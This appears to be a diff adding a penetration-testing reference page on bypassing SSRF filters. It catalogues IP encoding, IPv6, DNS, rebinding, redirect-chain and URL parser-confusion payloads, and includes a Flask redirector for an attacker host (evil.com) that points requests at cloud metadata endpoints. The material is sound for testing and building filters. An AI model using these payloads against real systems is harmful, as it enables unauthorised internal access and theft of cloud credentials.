@@ -1,0 +1,318 @@
+---
+title: Filter bypass
+description: Defeating SSRF allowlists and blocklists - IP encodings, DNS tricks, redirect chains, IPv6, URL parser confusion.
+mitre: [T1190, T1027]
+d3fend: [D3-MH, D3-OTF]
+impact: [InternalAccess]
+sidebar:
+  order: 4
+  label: Filter bypass
+---
+import { Aside, Steps, Tabs, TabItem } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Most SSRF filters check the URL string against a blocklist (`127.0.0.1`, `localhost`, `169.254.`) or an allowlist of approved domains. The string check is performed *before* the URL is parsed and resolved - leaving a gap. Exploit one of these:
+
+```
+# 127.0.0.1 alternates
+127.1                              # short-form
+0.0.0.0                            # any-interface
+2130706433                         # decimal
+017700000001                       # octal (with leading 0)
+0x7f000001                         # hex
+[::]                               # IPv6 unspecified
+[::ffff:127.0.0.1]                 # IPv4-mapped IPv6
+
+# Domain confusion
+http://example.com@127.0.0.1/      # @ split
+http://127.0.0.1#example.com/      # fragment
+http://127.0.0.1.nip.io/           # DNS resolves to 127.0.0.1
+http://allowed.com.evil.com/       # subdomain trick
+
+# Redirect chains
+http://evil.com/redirect           # → 302 Location: http://127.0.0.1
+```
+
+Success indicator: the bypass payload reaches an internal service that the original payload couldn't.
+
+## How filters fail
+
+Two common implementations, both broken:
+
+```python
+# Blocklist (broken - easily bypassed)
+if "127.0.0.1" in url or "localhost" in url:
+    deny()
+
+# Allowlist (better, often still broken)
+if not url.startswith("https://api.example.com/"):
+    deny()
+```
+
+The blocklist misses any encoding that doesn't match the literal string. The allowlist misses URL-parser quirks where the *parsed* host differs from what `startswith()` saw.
+
+The bypass is finding the gap between "what the filter sees" and "what the HTTP library fetches."
+
+## IPv4 alternate forms
+
+`127.0.0.1` is an integer - can be written many ways. Most HTTP libraries accept all forms.
+
+| Form | Value | Notes |
+| --- | --- | --- |
+| `127.0.0.1` | Standard | The blocked one |
+| `127.1` | Short-form | Skip middle zero octets |
+| `127.0.1` | Short-form | Same |
+| `2130706433` | Decimal | Single integer |
+| `017700000001` | Octal | Leading zero |
+| `0x7f000001` | Hex | `0x` prefix |
+| `0177.0.0.1` | Mixed | Octal first octet |
+| `0x7f.0.0.1` | Mixed | Hex first octet |
+| `127.0.0.1.` | Trailing dot | Bypasses some regex |
+
+Generate alternates programmatically:
+
+```python
+import socket, struct
+ip = "127.0.0.1"
+packed = socket.inet_aton(ip)
+decimal = struct.unpack("!I", packed)[0]
+print(f"Decimal: {decimal}")              # 2130706433
+print(f"Hex:     0x{decimal:08x}")        # 0x7f000001
+print(f"Octal:   0{decimal:o}")           # 017700000001
+```
+
+The same approach works for any internal IP - `169.254.169.254` (cloud metadata) becomes `2852039166` decimal, `0xa9fea9fe` hex.
+
+## Loopback alternates beyond 127.0.0.1
+
+The entire `127.0.0.0/8` range is loopback on Linux. Every address in that block reaches localhost:
+
+```
+127.0.0.1
+127.1.1.1
+127.255.255.254
+```
+
+Filters checking only `127.0.0.1` literal fail on `127.1.2.3`. Try a random non-`.0.0.1` loopback first.
+
+`0.0.0.0` is the IPv4 "any-interface" address. On Linux it routes to whatever is bound to all interfaces, which usually includes localhost services. Often unfiltered because filters assume "localhost = 127.0.0.1."
+
+## IPv6
+
+When IPv4 is filtered, IPv6 frequently isn't:
+
+```
+http://[::]/                         # unspecified, often resolves to localhost
+http://[::1]/                        # loopback
+http://[0:0:0:0:0:0:0:1]/            # expanded loopback
+http://[::ffff:127.0.0.1]/           # IPv4-mapped IPv6
+http://[::ffff:7f00:0001]/           # same, hex-encoded
+http://[fe80::1]/                    # link-local
+```
+
+If the application's HTTP library has IPv6 support (most do) and the localhost service binds IPv6 (most do via `0.0.0.0` translating to `::`), `[::]` reaches it.
+
+## DNS-based bypasses
+
+### Public DNS pointing at internal IPs
+
+Services like [nip.io](https://nip.io) and [sslip.io](https://sslip.io) resolve hostnames to whatever IP is encoded in the name:
+
+```
+127.0.0.1.nip.io       → resolves to 127.0.0.1
+192.168.1.1.nip.io     → resolves to 192.168.1.1
+metadata.google.internal.nip.io  → can't help with this one
+```
+
+Bypasses string-match filters that block IPs but allow domains. The filter sees `nip.io`; the resolver returns `127.0.0.1`.
+
+### Your own DNS pointing at internal IPs
+
+Set up a wildcard A record at a domain you own, pointing to whatever you want:
+
+```
+*.evil.com  A  127.0.0.1
+```
+
+Then `redis.evil.com` resolves to `127.0.0.1`. Filter sees `evil.com`; HTTP library connects to `127.0.0.1`. Works on any allowlist that uses substring matching.
+
+### DNS rebinding (advanced)
+
+For filters that resolve the hostname *and check the IP against a blocklist* but only check once before connecting:
+
+<Steps>
+
+1. Set up a DNS server you control with a TTL of 0 for the domain `attacker.com`
+2. First lookup returns `<external IP>` - passes the filter check
+3. Second lookup (the actual fetch) returns `127.0.0.1` - gets the internal connection
+
+</Steps>
+
+Tools that automate this: [rbndr.us](https://rbndr.us), [singularity-of-origin](https://github.com/nccgroup/singularity).
+
+DNS rebinding only works against filters that perform a separate resolution-and-check step *before* fetching. Most modern HTTP libraries cache resolution, so you have at most a few seconds between the check and the fetch.
+
+## URL parser confusion
+
+The richest source of bypasses. Different URL parsers disagree on what the "host" of a URL is.
+
+### Userinfo (`@`) split
+
+```
+http://example.com@127.0.0.1/
+```
+
+RFC 3986: the host is `127.0.0.1`; `example.com` is the userinfo. Some validators see `example.com` first and accept; the HTTP library connects to `127.0.0.1`.
+
+### Multiple `@`
+
+```
+http://example.com@evil.com@127.0.0.1/
+```
+
+Different parsers disagree. Try when single `@` is filtered.
+
+### Fragment
+
+```
+http://127.0.0.1/#example.com
+http://127.0.0.1/#@example.com
+```
+
+Fragment is client-side only - not sent to the server. Useless for redirection but sometimes confuses validators.
+
+### Path-as-host
+
+```
+http://example.com/path?next=http://127.0.0.1
+```
+
+Validator checks `host=example.com`, request library follows the embedded URL.
+
+### Backslash-as-host (Java)
+
+```
+http://example.com\@127.0.0.1/
+http://example.com\.evil.com/
+```
+
+Java's `URL` class historically treated `\` differently from `/`. Various CVEs exploit this.
+
+### Host header injection
+
+If the SSRF target is a host header rather than a URL, inject directly:
+
+```
+Host: 127.0.0.1
+Host: internal.app.local
+```
+
+Some apps use `request.host` as the fetch target unconditionally.
+
+## Whitelist subdomain tricks
+
+When the filter is `must contain "example.com"`:
+
+```
+http://allowed.example.com.evil.com/      # subdomain trick
+http://evil.com/?x=allowed.example.com     # path/query containing the string
+http://example.com.evil.com/               # if "example.com" is anywhere in the host
+http://exampleXcom.evil.com/               # if the dot is part of the check (rare)
+```
+
+When the filter is `must equal "api.example.com"`:
+
+```
+http://api.example.com.evil.com/           # subdomain hijack
+http://api.example.com@evil.com/           # @ split, see above
+```
+
+## Redirect chains
+
+When the application validates the URL but follows redirects:
+
+<Steps>
+
+1. **You host a redirector** at `http://evil.com/r` returning `302 Location: http://127.0.0.1/`. Quick Flask version:
+
+   ```python
+   # redir.py
+   from flask import Flask, redirect, request
+   app = Flask(__name__)
+   @app.route("/")
+   def r():
+       target = request.args.get("u", "http://127.0.0.1/")
+       return redirect(target, code=302)
+   app.run(host="0.0.0.0", port=80)
+   ```
+
+2. **Submit `http://evil.com/r`** to the SSRF parameter - passes the filter:
+
+   ```
+   ?url=http://<ATTACKER>/?u=http://169.254.169.254/latest/meta-data/
+   ```
+
+3. **Application fetches**, gets the redirect, follows it to `127.0.0.1`.
+
+</Steps>
+
+`curl` follows redirects only with `-L`, but most SSL libraries follow by default. Check the application's behavior - if it doesn't follow, redirect won't help.
+
+## Encoding tricks
+
+Layered URL encoding sometimes confuses validators:
+
+```
+http://127.0.0.1                    # plaintext
+http://127%2E0%2E0%2E1              # encoded dots
+http://%31%32%37%2E%30%2E%30%2E%31  # fully encoded
+http://%2531%2532%2537...           # double-encoded
+```
+
+Useful when the filter URL-decodes once and checks, but the HTTP library decodes again before fetching. Less common than parser-confusion bypasses but worth trying.
+
+## Schema-based bypasses
+
+When `http://` is filtered but the parser is permissive:
+
+```
+HTTP://127.0.0.1/                   # uppercase
+http:127.0.0.1/                     # missing slashes (lib-dependent)
+http:/127.0.0.1/                    # one slash
+//127.0.0.1/                        # protocol-relative (sometimes works)
+```
+
+When schema allowlist is in place (only `http(s)://`), use a different schema entirely from the [schemas page](/codex/web/server-side/ssrf/schemas/) - `gopher://`, `file://`, `dict://` may be unfiltered.
+
+## Putting it together
+
+A real engagement filter usually combines several checks. The bypass is usually a combination too:
+
+```
+# Filter: blocks 127.0.0.1 and 169.254., requires .example.com in URL
+?url=http://attacker.example.com.evil.com:80@2852039166/latest/meta-data/
+
+# Decoded:
+# - Filter sees: contains ".example.com" ✓, no 127.0.0.1, no "169.254." ✓
+# - Library sees: host = 2852039166 = 169.254.169.254
+# - userinfo "attacker.example.com.evil.com:80" discarded
+# - Result: cloud metadata reached
+```
+
+The methodology: identify what the filter is checking, then find a representation that passes the check while the HTTP library still connects internally.
+
+## Common failure modes
+
+- **All bypasses return identical "blocked" response.** Filter is checking the *resolved IP* in the network layer, not the URL string. Library-level workarounds won't help; you need DNS rebinding or no SSRF at all.
+- **`@` split causes URL parse error.** Some libraries reject userinfo. Try fragment trick or different parser-confusion variant.
+- **Decimal/hex IPs rejected.** Modern Python `urllib` and Go `net/http` reject these. Java and curl accept. Test before relying on the bypass.
+- **Bypass works for HTTP but not gopher.** Gopher syntax is more rigid; many parser tricks (especially `@`-split) break gopher URLs. Stick with hostname-only forms (`127.1`, decimal IP) for gopher.
+- **`[::ffff:127.0.0.1]` returns "Address family not supported."** Application's HTTP library or OS is IPv4-only. IPv6 bypass tier is unavailable; focus on IPv4 alternates.
+- **Filter normalizes the URL before checking.** Modern libraries (e.g., recent `urllib.parse`) canonicalize before validation. Bypass requires either a different library quirk or moving up the stack to redirect chains / DNS rebinding.
+
+## Notes
+
+The hierarchy when you hit a filter: try IP alternates first (cheapest), then schema swaps, then parser tricks (`@`-split, fragment), then external assets you control (DNS, redirector). Save DNS rebinding for last - it's the most reliable but also the most setup.
+
+Most filter bypass on real engagements is one or two layers, not the full kitchen-sink combo above. If `127.1` or `0.0.0.0` works, stop there - extra encoding adds failure points.
